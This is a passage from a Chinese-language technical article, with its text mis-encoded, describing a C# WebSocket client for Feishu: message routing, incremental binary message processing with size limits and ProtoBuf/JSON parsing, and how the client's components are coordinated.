<li>é€šçŸ¥æ¶ˆæ¯ï¼š<code>notification</code>ç±»å‹ï¼Œå¦‚ç³»ç»Ÿé€šçŸ¥</li>
</ul>
</li>
<li>
<p><strong>åŸºäºä¼˜å…ˆçº§çš„åŒ¹é…</strong>ï¼š</p>
<ul>
<li>é«˜ä¼˜å…ˆçº§å¤„ç†å™¨ï¼šè®¤è¯ã€å¿ƒè·³ç­‰å…³é”®æ¶ˆæ¯</li>
<li>ä¸­ä¼˜å…ˆçº§å¤„ç†å™¨ï¼šä¸šåŠ¡äº‹ä»¶ã€ç”¨æˆ·æ¶ˆæ¯</li>
<li>ä½ä¼˜å…ˆçº§å¤„ç†å™¨ï¼šç»Ÿè®¡æ•°æ®ã€æ—¥å¿—ä¿¡æ¯</li>
</ul>
</li>
</ol>
<p><strong>å¤„ç†å™¨æ³¨å†Œæœºåˆ¶</strong></p>
<p>æ¶ˆæ¯è·¯ç”±å™¨æ”¯æŒåŠ¨æ€æ³¨å†Œå’Œæ³¨é”€æ¶ˆæ¯å¤„ç†å™¨ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// æ³¨å†Œå¤„ç†å™¨</span>
router.RegisterHandler(<span class="hljs-keyword">new</span> AuthMessageHandler());
router.RegisterHandler(<span class="hljs-keyword">new</span> EventMessageHandler());
router.RegisterHandler(<span class="hljs-keyword">new</span> BinaryMessageHandler());

<span class="hljs-comment">// å¤„ç†å™¨æ¥å£å®šä¹‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IMessageHandler</span>
{
    <span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CanHandle</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> messageType, MessageVersionInfo version</span>)</span>;
    <span class="hljs-function">Task&lt;HandlerResult&gt; <span class="hljs-title">HandleAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, CancellationToken cancellationToken</span>)</span>;
    <span class="hljs-built_in">int</span> Priority { <span class="hljs-keyword">get</span>; }
}
</code></pre>
<p><strong>æ€§èƒ½ä¼˜åŒ–ç­–ç•¥</strong></p>
<ol>
<li><strong>å¹¶è¡Œå¤„ç†</strong>ï¼šæ”¯æŒå¤šä¸ªæ¶ˆæ¯å¹¶è¡Œå¤„ç†ï¼Œæé«˜ååé‡</li>
<li><strong>ç¼“å­˜æœºåˆ¶</strong>ï¼šç¼“å­˜å¤„ç†å™¨åŒ¹é…ç»“æœï¼Œå‡å°‘é‡å¤è®¡ç®—</li>
<li><strong>æ‰¹å¤„ç†</strong>ï¼šæ”¯æŒæ‰¹é‡æ¶ˆæ¯å¤„ç†ï¼Œå‡å°‘ç½‘ç»œå¼€é”€</li>
<li><strong>è¿æ¥æ± </strong>ï¼šå¤ç”¨è¿æ¥èµ„æºï¼Œæé«˜è¿æ¥æ•ˆç‡</li>
</ol>
<p><strong>é”™è¯¯å¤„ç†æœºåˆ¶</strong></p>
<ol>
<li><strong>å®¹é”™è®¾è®¡</strong>ï¼šå•ä¸ªå¤„ç†å™¨å¼‚å¸¸ä¸å½±å“å…¶ä»–å¤„ç†å™¨</li>
<li><strong>é™çº§ç­–ç•¥</strong>ï¼šæ— åŒ¹é…å¤„ç†å™¨æ—¶ä½¿ç”¨é»˜è®¤å¤„ç†é€»è¾‘</li>
<li><strong>é‡è¯•æœºåˆ¶</strong>ï¼šå¤„ç†å¤±è´¥æ—¶æ”¯æŒè‡ªåŠ¨é‡è¯•</li>
<li><strong>ç›‘æ§å‘Šè­¦</strong>ï¼šè®°å½•å¤„ç†å¼‚å¸¸å¹¶è§¦å‘å‘Šè­¦æœºåˆ¶</li>
</ol>
<p><strong>å¤„ç†å™¨åˆ†å‘æœºåˆ¶</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> è·¯ç”±ç­–ç•¥å®ç°</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">RoutingStrategy</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;MessageRouter&gt; _logger;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> FeishuWebSocketOptions _options;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">RouteMessageAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, <span class="hljs-built_in">string</span> sourceType, 
        List&lt;IMessageHandler&gt; handlers, CancellationToken cancellationToken</span>)</span>
    {
        <span class="hljs-comment">// æå–æ¶ˆæ¯ç±»å‹</span>
        <span class="hljs-keyword">var</span> messageType = ExtractMessageType(message);
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(messageType))
        {
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
                _logger.LogWarning(<span class="hljs-string">"æ— æ³•æå–æ¶ˆæ¯ç±»å‹ (æ¥æº: {SourceType}): {Message}"</span>, sourceType, message);
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// æŸ¥æ‰¾èƒ½å¤„ç†è¯¥æ¶ˆæ¯ç±»å‹çš„å¤„ç†å™¨</span>
        <span class="hljs-keyword">var</span> handler = handlers.FirstOrDefault(h =&gt; h.CanHandle(messageType));
        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>)
        {
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
                _logger.LogWarning(<span class="hljs-string">"æœªæ‰¾åˆ°èƒ½å¤„ç†æ¶ˆæ¯ç±»å‹ {MessageType} çš„å¤„ç†å™¨ (æ¥æº: {SourceType})"</span>, 
                    messageType, sourceType);
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-keyword">if</span> (_options.EnableLogging)
            _logger.LogDebug(<span class="hljs-string">"å°†æ¶ˆæ¯è·¯ç”±åˆ°å¤„ç†å™¨: {HandlerType} (æ¥æº: {SourceType}, æ¶ˆæ¯ç±»å‹: {MessageType})"</span>,
                handler.GetType().Name, sourceType, messageType);
        
        <span class="hljs-keyword">await</span> handler.HandleAsync(message, cancellationToken);
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æå–æ¶ˆæ¯ç±»å‹</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> <span class="hljs-title">ExtractMessageType</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message</span>)</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-keyword">using</span> <span class="hljs-keyword">var</span> jsonDoc = JsonDocument.Parse(message);
            <span class="hljs-keyword">var</span> root = jsonDoc.RootElement;
            
            <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸ºv2.0ç‰ˆæœ¬</span>
            <span class="hljs-keyword">if</span> (root.TryGetProperty(<span class="hljs-string">"schema"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> schemaElement) &amp;&amp;
                schemaElement.GetString() == <span class="hljs-string">"2.0"</span>)
            {
                <span class="hljs-keyword">if</span> (root.TryGetProperty(<span class="hljs-string">"header"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> headerElement) &amp;&amp;
                    headerElement.TryGetProperty(<span class="hljs-string">"event_type"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> eventTypeElement))
                {
                    <span class="hljs-keyword">return</span> <span class="hljs-string">"event"</span>; <span class="hljs-comment">// v2.0ä¸»è¦æ˜¯äº‹ä»¶æ¶ˆæ¯</span>
                }
            }
            
            <span class="hljs-comment">// v1.0ç‰ˆæœ¬å¤„ç†</span>
            <span class="hljs-keyword">if</span> (root.TryGetProperty(<span class="hljs-string">"type"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> typeElement))
            {
                <span class="hljs-keyword">return</span> typeElement.GetString()?.ToLowerInvariant() ?? <span class="hljs-built_in">string</span>.Empty;
            }
            
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;
        }
        <span class="hljs-keyword">catch</span> (JsonException ex)
        {
            _logger.LogError(ex, <span class="hljs-string">"è§£ææ¶ˆæ¯JSONå¤±è´¥"</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;
        }
    }
}
</code></pre>
<h3 data-id="heading-11">3.4 äºŒè¿›åˆ¶æ¶ˆæ¯å¤„ç†å™¨ï¼ˆBinaryMessageProcessorï¼‰</h3>
<p>äºŒè¿›åˆ¶æ¶ˆæ¯å¤„ç†å™¨æ˜¯é£ä¹¦WebSocketæ¡†æ¶ä¸­ä¸“é—¨å¤„ç†äºŒè¿›åˆ¶æ•°æ®æµçš„æ ¸å¿ƒç»„ä»¶ï¼Œè´Ÿè´£å¢é‡æ¥æ”¶ã€æ•°æ®ç»„è£…ã€æ ¼å¼è§£æå’Œæ¶ˆæ¯åˆ†å‘ã€‚å®ƒé‡‡ç”¨æµå¼å¤„ç†æ¶æ„ï¼Œæ”¯æŒå¤§æ¶ˆæ¯çš„åˆ†ç‰‡æ¥æ”¶å’Œè§£æã€‚</p>
<p><strong>äºŒè¿›åˆ¶æ¶ˆæ¯å¤„ç†æ¶æ„</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[WebSocketäºŒè¿›åˆ¶æ•°æ®] --&gt; B[äºŒè¿›åˆ¶æ¶ˆæ¯å¤„ç†å™¨]
    B --&gt; C[æ•°æ®æ¥æ”¶ç®¡ç†]
    C --&gt; D{æ¶ˆæ¯çŠ¶æ€}
    
    D --&gt;|æ–°æ¶ˆæ¯| E[åˆå§‹åŒ–å†…å­˜æµ]
    D --&gt;|æ¶ˆæ¯ç‰‡æ®µ| F[å†™å…¥æ•°æ®ç‰‡æ®µ]
    D --&gt;|æ¶ˆæ¯å®Œæˆ| G[ç»„è£…å®Œæ•´æ•°æ®]
    
    E --&gt; H[æ£€æŸ¥å¤§å°é™åˆ¶]
    F --&gt; H
    H --&gt; I{å¤§å°è¶…é™?}
    
    I --&gt;|æ˜¯| J[è§¦å‘é”™è¯¯äº‹ä»¶]
    I --&gt;|å¦| K[ç»§ç»­æ¥æ”¶]
    
    G --&gt; L[ProtoBufè§£æ]
    L --&gt; M{è§£ææˆåŠŸ?}
    
    M --&gt;|æ˜¯| N[æå–JSON Payload]
    M --&gt;|å¦| O[JSON Fallback]
    
    N --&gt; P[è·¯ç”±åˆ°MessageRouter]
    O --&gt; P
    P --&gt; Q[å‘é€ACKå“åº”]
    
    J --&gt; R[æ¸…ç†èµ„æº]
    Q --&gt; R
    
    style B fill:#e1f5fe
    style C fill:#fff3e0
    style L fill:#f3e5f5
    style P fill:#e8f5e8
</code></pre>
<p><strong>å¢é‡æ•°æ®æ¥æ”¶</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> äºŒè¿›åˆ¶æ¶ˆæ¯å¤„ç†å™¨ - è´Ÿè´£å¤„ç†äºŒè¿›åˆ¶æ•°æ®çš„å¢é‡æ¥æ”¶å’Œè§£æ</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">BinaryMessageProcessor</span> : <span class="hljs-title">IDisposable</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;BinaryMessageProcessor&gt; _logger;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> FeishuWebSocketOptions _options;
    <span class="hljs-keyword">private</span> MemoryStream? _binaryDataStream;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">object</span> _binaryDataStreamLock = <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>();
    <span class="hljs-keyword">private</span> DateTime _binaryDataReceiveStartTime = DateTime.MinValue;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">bool</span> _disposed = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> MessageRouter? _messageRouter;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> WebSocketConnectionManager? _connectionManager;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketBinaryMessageEventArgs&gt;? BinaryMessageReceived;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketErrorEventArgs&gt;? Error;

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å¤„ç†äºŒè¿›åˆ¶æ•°æ®</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ProcessBinaryDataAsync</span>(<span class="hljs-params"><span class="hljs-built_in">byte</span>[] data, <span class="hljs-built_in">int</span> offset, <span class="hljs-built_in">int</span> count, 
        <span class="hljs-built_in">bool</span> endOfMessage, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-keyword">lock</span> (_binaryDataStreamLock)
            {
                <span class="hljs-comment">// å¦‚æœæ˜¯æ–°æ¶ˆæ¯çš„å¼€å§‹ï¼Œåˆå§‹åŒ–å†…å­˜æµ</span>
                <span class="hljs-keyword">if</span> (_binaryDataStream == <span class="hljs-literal">null</span>)
                {
                    _binaryDataStream = <span class="hljs-keyword">new</span> MemoryStream();
                    _binaryDataReceiveStartTime = DateTime.UtcNow;
                    
                    <span class="hljs-keyword">if</span> (_options.EnableLogging)
                        _logger.LogDebug(<span class="hljs-string">"å¼€å§‹æ¥æ”¶æ–°çš„äºŒè¿›åˆ¶æ¶ˆæ¯"</span>);
                }
                
                <span class="hljs-comment">// å†™å…¥æ•°æ®ç‰‡æ®µ</span>
                _binaryDataStream.Write(data, offset, count);
                
                <span class="hljs-comment">// æ£€æŸ¥æ•°æ®å¤§å°é™åˆ¶</span>
                <span class="hljs-keyword">if</span> (_binaryDataStream.Length &gt; _options.MaxBinaryMessageSize)
                {
                    <span class="hljs-keyword">var</span> errorMessage = <span class="hljs-string">$"äºŒè¿›åˆ¶æ¶ˆæ¯å¤§å°è¶…è¿‡é™åˆ¶ (<span class="hljs-subst">{_binaryDataStream.Length}</span> &gt; <span class="hljs-subst">{_options.MaxBinaryMessageSize}</span>)"</span>;
                    _logger.LogError(errorMessage);
                    
                    <span class="hljs-comment">// æ¸…ç†å½“å‰æ•°æ®æµ</span>
                    _binaryDataStream.Dispose();
                    _binaryDataStream = <span class="hljs-literal">null</span>;
                    
                    <span class="hljs-comment">// è§¦å‘é”™è¯¯äº‹ä»¶</span>
                    OnError(errorMessage, <span class="hljs-string">"MessageSizeExceeded"</span>);
                    <span class="hljs-keyword">return</span>;
                }
                
                <span class="hljs-comment">// å¦‚æœæ¶ˆæ¯æ¥æ”¶å®Œæˆ</span>
                <span class="hljs-keyword">if</span> (endOfMessage)
                {
                    <span class="hljs-keyword">var</span> completeData = _binaryDataStream.ToArray();
                    <span class="hljs-keyword">var</span> receiveDuration = DateTime.UtcNow - _binaryDataReceiveStartTime;
                    
                    <span class="hljs-keyword">if</span> (_options.EnableLogging)
                        _logger.LogInformation(<span class="hljs-string">"äºŒè¿›åˆ¶æ¶ˆæ¯æ¥æ”¶å®Œæˆï¼Œå¤§å°: {Size} å­—èŠ‚ï¼Œè€—æ—¶: {Duration}ms"</span>,
                            completeData.Length, receiveDuration.TotalMilliseconds);
                    
                    <span class="hljs-comment">// å¼‚æ­¥å¤„ç†å®Œæ•´çš„äºŒè¿›åˆ¶æ¶ˆæ¯</span>
                    _ = Task.Run(<span class="hljs-keyword">async</span> () =&gt;
                    {
                        <span class="hljs-keyword">await</span> ProcessCompleteBinaryMessageAsync(completeData, cancellationToken);
                    }, cancellationToken);
                    
                    <span class="hljs-comment">// æ¸…ç†èµ„æº</span>
                    _binaryDataStream.Dispose();
                    _binaryDataStream = <span class="hljs-literal">null</span>;
                }
                <span class="hljs-keyword">else</span>
                {
                    <span class="hljs-keyword">if</span> (_options.EnableLogging)
                        _logger.LogDebug(<span class="hljs-string">"å·²æ¥æ”¶äºŒè¿›åˆ¶æ¶ˆæ¯ç‰‡æ®µï¼Œå½“å‰æ€»å¤§å°: {Size} å­—èŠ‚"</span>, 
                            _binaryDataStream.Length);
                }
            }
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            <span class="hljs-comment">// å‘ç”Ÿå¼‚å¸¸æ—¶æ¸…ç†èµ„æº</span>
            <span class="hljs-keyword">lock</span> (_binaryDataStreamLock)
            {
                _binaryDataStream?.Dispose();
                _binaryDataStream = <span class="hljs-literal">null</span>;
            }
            
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
                _logger.LogError(ex, <span class="hljs-string">"å¤„ç†äºŒè¿›åˆ¶æ¶ˆæ¯æ—¶å‘ç”Ÿé”™è¯¯"</span>);
            OnError(<span class="hljs-string">$"å¤„ç†äºŒè¿›åˆ¶æ¶ˆæ¯æ—¶å‘ç”Ÿé”™è¯¯: <span class="hljs-subst">{ex.Message}</span>"</span>, ex.GetType().Name);
        }
    }
}
</code></pre>
<p><strong>æ ¸å¿ƒç‰¹æ€§</strong></p>
<ul>
<li>ğŸ“¦ <strong>æµå¼å¤„ç†</strong>ï¼šæ”¯æŒå¤§æ¶ˆæ¯åˆ†ç‰‡æ¥æ”¶</li>
<li>ğŸ”„ <strong>åŒæ ¼å¼æ”¯æŒ</strong>ï¼šProtoBufä¼˜å…ˆï¼ŒJSONå›é€€</li>
<li>ğŸ“Š <strong>å¤§å°é™åˆ¶</strong>ï¼šå¯é…ç½®çš„æ¶ˆæ¯å¤§å°é™åˆ¶</li>
<li>ğŸ¯ <strong>è‡ªåŠ¨è·¯ç”±</strong>ï¼šè§£æåè‡ªåŠ¨è·¯ç”±åˆ°æ¶ˆæ¯å¤„ç†å™¨</li>
</ul>
<p><strong>å¤„ç†æµç¨‹</strong></p>
<ol>
<li><strong>å¢é‡æ¥æ”¶</strong>ï¼šåˆ†ç‰‡æ¥æ”¶äºŒè¿›åˆ¶æ•°æ®ï¼Œå†™å…¥å†…å­˜æµ</li>
<li><strong>å¤§å°æ£€æŸ¥</strong>ï¼šå®æ—¶ç›‘æ§æ•°æ®å¤§å°ï¼Œé˜²æ­¢å†…å­˜æº¢å‡º</li>
<li><strong>æ ¼å¼è§£æ</strong>ï¼šProtoBufååºåˆ—åŒ–ï¼Œå¤±è´¥åˆ™å›é€€åˆ°JSON</li>
<li><strong>æ¶ˆæ¯è·¯ç”±</strong>ï¼šæå–JSON Payloadï¼Œè·¯ç”±åˆ°å¯¹åº”å¤„ç†å™¨</li>
<li><strong>ACKç¡®è®¤</strong>ï¼šå‘æœåŠ¡å™¨å‘é€å¤„ç†ç¡®è®¤</li>
</ol>
<h3 data-id="heading-12">ä¸»å®¢æˆ·ç«¯é›†æˆï¼ˆFeishuWebSocketClientï¼‰</h3>
<p>FeishuWebSocketClientæ˜¯æ•´ä¸ªæ¡†æ¶çš„é—¨é¢ç»„ä»¶ï¼Œè´Ÿè´£åè°ƒå’Œç¼–æ’å„ä¸ªå­ç»„ä»¶çš„å·¥ä½œã€‚å®ƒé‡‡ç”¨ç»„ä»¶åŒ–è®¾è®¡æ¨¡å¼ï¼Œå°†å¤æ‚çš„WebSocketè¿æ¥ç®¡ç†åŠŸèƒ½åˆ†è§£ä¸ºç‹¬ç«‹çš„ã€å¯å¤ç”¨çš„ç»„ä»¶ï¼Œå¹¶é€šè¿‡ç»Ÿä¸€çš„äº‹ä»¶ç³»ç»Ÿè¿›è¡Œé›†æˆã€‚</p>
<p><strong>å®¢æˆ·ç«¯æ¶æ„é›†æˆ</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[FeishuWebSocketClient] --&gt; B[WebSocketConnectionManager]
    A --&gt; C[AuthenticationManager]
    A --&gt; D[MessageRouter]
    A --&gt; E[BinaryMessageProcessor]
    A --&gt; F[EventHandlerFactory]
    
    B --&gt; G[è¿æ¥ç®¡ç†&lt;br/&gt;å»ºç«‹/æ–­å¼€/é‡è¿]
    C --&gt; H[è®¤è¯ç®¡ç†&lt;br/&gt;è®¤è¯/çŠ¶æ€/é‡è¯•]
    D --&gt; I[æ¶ˆæ¯è·¯ç”±&lt;br/&gt;åˆ†å‘/å¤„ç†/è·¯ç”±]
    E --&gt; J[äºŒè¿›åˆ¶å¤„ç†&lt;br/&gt;è§£æ/ç»„è£…/ACK]
    F --&gt; K[äº‹ä»¶å¤„ç†&lt;br/&gt;æ³¨å†Œ/åˆ†å‘/å›è°ƒ]
    
    A --&gt; L[äº‹ä»¶ç³»ç»Ÿ]
    L --&gt; M[Connected]
    L --&gt; N[Disconnected]
    L --&gt; O[Authenticated]
    L --&gt; P[MessageReceived]
    L --&gt; Q[Error]
    L --&gt; R[BinaryMessageReceived]
    
    S[æ¶ˆæ¯é˜Ÿåˆ—] --&gt; A
    T[å¿ƒè·³ç›‘æ§] --&gt; A
    U[é…ç½®ç®¡ç†] --&gt; A
    
    style A fill:#e1f5fe
    style B fill:#fff3e0
    style C fill:#f3e5f5
    style D fill:#e8f5e8
    style E fill:#fce4ec
</code></pre>
<p><strong>ç»„ä»¶åè°ƒä¸ç¼–æ’</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> é£ä¹¦WebSocketå®¢æˆ·ç«¯ - é‡‡ç”¨ç»„ä»¶åŒ–è®¾è®¡æé«˜å¯ç»´æŠ¤æ€§</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">FeishuWebSocketClient</span> : <span class="hljs-title">IFeishuWebSocketClient</span>, <span class="hljs-title">IDisposable</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;FeishuWebSocketClient&gt; _logger;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> FeishuWebSocketOptions _options;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IFeishuEventHandlerFactory _eventHandlerFactory;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> WebSocketConnectionManager _connectionManager;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> AuthenticationManager _authManager;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> MessageRouter _messageRouter;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> BinaryMessageProcessor _binaryProcessor;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ConcurrentQueue&lt;<span class="hljs-built_in">string</span>&gt; _messageQueue = <span class="hljs-keyword">new</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> List&lt;Func&lt;<span class="hljs-built_in">string</span>, Task&gt;&gt; _messageProcessors = <span class="hljs-keyword">new</span>();
    <span class="hljs-keyword">private</span> Task? _messageProcessingTask;
    <span class="hljs-keyword">private</span> ILoggerFactory _loggerFactory;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">bool</span> _disposed = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> CancellationTokenSource? _cancellationTokenSource;

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> WebSocketState State =&gt; _connectionManager.State;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> IsAuthenticated =&gt; _authManager.IsAuthenticated;

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;EventArgs&gt;? Connected;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketCloseEventArgs&gt;? Disconnected;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketMessageEventArgs&gt;? MessageReceived;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketErrorEventArgs&gt;? Error;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;EventArgs&gt;? Authenticated;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketPingEventArgs&gt;? PingReceived;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketPongEventArgs&gt;? PongReceived;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketHeartbeatEventArgs&gt;? HeartbeatReceived;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketFeishuEventArgs&gt;? FeishuEventReceived;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketBinaryMessageEventArgs&gt;? BinaryMessageReceived;

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> é»˜è®¤æ„é€ å‡½æ•°</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">FeishuWebSocketClient</span>(<span class="hljs-params">
        ILogger&lt;FeishuWebSocketClient&gt; logger,
        IFeishuEventHandlerFactory eventHandlerFactory,
        ILoggerFactory loggerFactory,
        FeishuWebSocketOptions? options = <span class="hljs-literal">null</span></span>)</span>
    {
        _logger = logger ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(logger));
        _eventHandlerFactory = eventHandlerFactory ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(eventHandlerFactory));
        _options = options ?? <span class="hljs-keyword">new</span> FeishuWebSocketOptions();
        _loggerFactory = loggerFactory;
        
        <span class="hljs-comment">// åˆå§‹åŒ–ç»„ä»¶</span>
        _connectionManager = <span class="hljs-keyword">new</span> WebSocketConnectionManager(_loggerFactory.CreateLogger&lt;WebSocketConnectionManager&gt;(), _options);
        _authManager = <span class="hljs-keyword">new</span> AuthenticationManager(_loggerFactory.CreateLogger&lt;AuthenticationManager&gt;(), _options, (message) =&gt; SendMessageAsync(message));
        _messageRouter = <span class="hljs-keyword">new</span> MessageRouter(_loggerFactory.CreateLogger&lt;MessageRouter&gt;(), _options);
        _binaryProcessor = <span class="hljs-keyword">new</span> BinaryMessageProcessor(_loggerFactory.CreateLogger&lt;BinaryMessageProcessor&gt;(), _connectionManager, _options, _messageRouter);

        <span class="hljs-comment">// è®¢é˜…ç»„ä»¶äº‹ä»¶</span>
        SubscribeToComponentEvents();

        <span class="hljs-comment">// æ³¨å†Œæ¶ˆæ¯å¤„ç†å™¨</span>
        RegisterMessageHandlers();
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> è®¢é˜…ç»„ä»¶äº‹ä»¶</span>
